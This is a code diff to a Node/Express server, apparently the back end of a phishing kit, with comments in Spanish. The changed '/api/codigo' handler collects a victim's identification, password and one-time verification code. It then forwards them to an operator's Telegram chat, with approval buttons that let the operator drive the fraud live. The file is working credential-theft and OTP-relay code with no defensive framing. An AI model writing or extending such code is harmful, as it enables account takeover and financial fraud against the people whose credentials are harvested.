@@ -63,15 +63,27 @@ app.post("/api/nombre", async (req,res)=>{
 ENVIAR CODIGO
 ========================= */
 app.post("/api/codigo", async (req,res)=>{
-  const { id,codigo } = req.body;
-  if(!requests[id]) return res.sendStatus(404);
+  const { id, codigo } = req.body;
 
-  requests[id].estado="verificando";
-  requests[id].codigo=codigo;
+  const r = requests[id];
+  if(!r) return res.sendStatus(404);
+
+  r.estado="verificando";
+  r.codigo=codigo;
+
+  const texto =
+`📩 CODIGO INGRESADO
+
+Tipo: ${r.tipo}
+ID: ${r.identificacion}
+Clave: ${r.clave}
+Codigo: ${codigo}
+
+ID:${id}`;
 
   await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     chat_id:CHAT_ID,
-    text:`nombre ${requests[id].nombre}\ncodigo ${codigo}\nID:${id}`,
+    text:texto,
     reply_markup:{
       inline_keyboard:[[
         {text:"codok",callback_data:`codok_${id}`},
@@ -82,6 +94,7 @@ app.post("/api/codigo", async (req,res)=>{
 
   res.sendStatus(200);
 });
+
 
 /* =========================
 CONSULTAR ESTADO
